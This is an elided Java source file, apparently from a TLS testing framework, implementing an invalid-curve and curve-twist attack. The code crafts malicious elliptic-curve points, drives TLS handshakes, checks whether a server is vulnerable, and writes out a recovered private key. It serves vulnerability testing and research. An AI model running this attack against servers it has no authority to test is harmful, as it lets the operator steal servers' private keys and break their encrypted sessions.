...
public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
    ...
    public InvalidCurveAttacker(
            InvalidCurveAttackConfig config, Config baseConfig, ParallelExecutor executor) {
        super(config, baseConfig);
    ...
    public void executeAttack() {
        ...
        LOGGER.info(
                "Executing attack against the server with named curve {}",
                invalidCurveAttackConfig_NamedGroup);
    ...
    public VulnerabilityType isVulnerable() {
        if (!AlgorithmResolver.getKeyExchangeAlgorithm(
                        getTlsConfig().getDefaultSelectedCipherSuite())
                .isEC()) {
            LOGGER.info(
                    "The CipherSuite that should be tested is not an Ec one:"
        ...
        if (config.isCurveTwistAttack()) {
            ...
            if (config.getNamedGroup() == NamedGroup.ECDH_X25519
                ...
                RFC7748Curve rfcCurve =
                        (RFC7748Curve) CurveFactory.getCurve(config.getNamedGroup());
                Point montgPoint =
                        rfcCurve.getPoint(
                                config.getPublicPointBaseX(), config.getPublicPointBaseY());
                Point weierPoint = rfcCurve.toWeierstrass(montgPoint);
                transformedX =
                        weierPoint
                                .getFieldX()
                                .getData()
                                .multiply(config.getCurveTwistD())
                                .mod(curve.getModulus());
            } else {
                transformedX =
                        config.getPublicPointBaseX()
                                .multiply(config.getCurveTwistD())
                                .mod(curve.getModulus());
            }
            ...
            point =
                    Point.createPoint(
                            transformedX, config.getPublicPointBaseY(), config.getNamedGroup());
        } else {
            curve = CurveFactory.getCurve(config.getNamedGroup());
            point =
                    Point.createPoint(
                            config.getPublicPointBaseX(),
                            config.getPublicPointBaseY(),
        ...
        for (int i = 1; i <= protocolFlows; i++) {
            ...
            InvalidCurveTask taskToAdd =
                    new InvalidCurveTask(
                            buildState(), executor.getReexecutions(), i + config.getKeyOffset());
    ...
    private void setBasePoints() {
        if (config.getNamedGroup() == NamedGroup.SECP160K1) {
            config.setPublicPointBaseX(
                    new BigInteger("2E92424F6F5DCEB9445903D9790A060061B5385F", 16));
            config.setPublicPointBaseY(
                    new BigInteger("A70CABD03A14C31A9693F2A4B0B9644E512BC671", 16));
        } else if (config.getNamedGroup() == NamedGroup.SECP160R1) {
            config.setPublicPointBaseX(
                    new BigInteger("12352B91C125BEF7CF3F5675357130A71FA9FD09", 16));
            config.setPublicPointBaseY(
                    new BigInteger("BBDDDABFA042D3556964D7356ACE8B1E251F3615", 16));
        } else if (config.getNamedGroup() == NamedGroup.SECP160R2) {
            config.setPublicPointBaseX(
                    new BigInteger("343F691A0C2F9B528329D3902F0729E4F1019815", 16));
            config.setPublicPointBaseY(
                    new BigInteger("9F7DBEB407C61B93758FCAAF0242BC7DDE5C6387", 16));
        } else if (config.getNamedGroup() == NamedGroup.SECP192K1) {
            config.setPublicPointBaseX(
                    new BigInteger("BA64DE391455A01A0B879E42F2C5B260619ABD8807323AE6", 16));
            config.setPublicPointBaseY(
                    new BigInteger("3C4B31082E9362EF3C4AC5D1352AFF8EDBA87A791D407A74", 16));
        } else if (config.getNamedGroup() == NamedGroup.SECP192R1) {
            config.setPublicPointBaseX(
                    new BigInteger("6EF5DB952BE3D282A58A9CBD14F2B2CA5AE6A41205C35D5B", 16));
            config.setPublicPointBaseY(
                    new BigInteger("9D87E2B0764AC9662426ECDF9C3EC9A00F1FF33F46989CEB", 16));
        } else if (config.getNamedGroup() == NamedGroup.SECP224K1) {
            config.setPublicPointBaseX(
                    new BigInteger("F9345F9680736FACFA8BAC276194CE7B47EB83E53CE3D355AF190762", 16));
            config.setPublicPointBaseY(
                    new BigInteger("DA616B66C7C6B44241FCCA14CD60BA580E074FE424CA4D7CB95445D6", 16));
        } else if (config.getNamedGroup() == NamedGroup.SECP224R1) {
            config.setPublicPointBaseX(
                    new BigInteger("E5DEFEC40F18FDABAC7328AE1FC866D0B2C5D67CACF0241FA900143D", 16));
            config.setPublicPointBaseY(
                    new BigInteger("E6DBC78A6F02D0C560A0CF30BA8D78CBA637180E5040B10E43382F77", 16));
            ...
            config.setPublicPointBaseX(
                    new BigInteger(
                            "A687CC3F639ED6E82427C8F6DED934688AEAA3ECE0718CA96BAC6B16771A95D8",
                            16));
            config.setPublicPointBaseY(
                    new BigInteger(
                            "259A64D19A3050394073C5D825CED3D4E173751407BDD2FEF0B570B01EE61DAC",
                            16));
            ...
            config.setPublicPointBaseY(
                    new BigInteger(
                            "4FF16328A76F0906BDF0DDB7DCD927D91BC1E46375AA1B71FE86DDE722B595B9C711C36CFD5FD8F76F7E1B6AEB60AFB",
                            16));
            ...
            if (sharedPoint.getFieldX() == null) {
                ...
                if (config.isCurveTwistAttack()) {
                    ...
                    premasterSecret =
                            premasterSecret
                                    .multiply(
                                            config.getCurveTwistD().modInverse(curve.getModulus()))
                                    .mod(curve.getModulus());
                    if (config.getNamedGroup() == NamedGroup.ECDH_X25519
                            || config.getNamedGroup() == NamedGroup.ECDH_X448) {
                        ...
                        Point weierPoint =
                                rfcCurve.getPoint(
                                        premasterSecret, sharedPoint.getFieldY().getData());
    ...
    private State buildState() {
        ...
        Point basepoint =
                new Point(
                        new FieldElementFp(config.getPublicPointBaseX(), curve.getModulus()),
        ...
        if (curve instanceof RFC7748Curve) {
            ...
            serialized =
                    PointFormatter.formatToByteArray(
                            config.getNamedGroup(), basepoint, config.getPointCompressionFormat());
        }
    ...
    private WorkflowTrace prepareRegularTrace(
            ModifiableByteArray serializedPublicKey,
        ...
        if (individualConfig.getHighestProtocolVersion().isTLS13()) {
            ...
            trace.addTlsAction(
                    new SendAction(
                            new ECDHClientKeyExchangeMessage(individualConfig),
                            new ChangeCipherSpecMessage(individualConfig),
                            new FinishedMessage(individualConfig)));
            trace.addTlsAction(new GenericReceiveAction());
    ...
    private WorkflowTrace prepareRenegotiationTrace(
            ModifiableByteArray serializedPublicKey,
            ModifiableByteArray pms,
            byte[] explicitPMS,
            Config individualConfig) {
        ...
        if (individualConfig.getHighestProtocolVersion().isTLS13()) {
            ...
            trace.addTlsAction(
                    new ReceiveAction(
                            ActionOption.CHECK_ONLY_EXPECTED, new NewSessionTicketMessage(false)));
    ...
    private EllipticCurveOverFp buildTwistedCurve() {
        ...
        BigInteger modA =
                intendedCurve
                        .getFieldA()
                        .getData()
                        .multiply(config.getCurveTwistD().pow(2))
                        .mod(intendedCurve.getModulus());
        BigInteger modB =
                intendedCurve
                        .getFieldB()
                        .getData()
                        .multiply(config.getCurveTwistD().pow(3))
                        .mod(intendedCurve.getModulus());
    ...
    private String generatePrivateKeyFile(BigInteger result, Config tlsConfig) {
        CustomECPrivateKey key =
                new CustomECPrivateKey(result, tlsConfig.getDefaultSelectedNamedGroup());
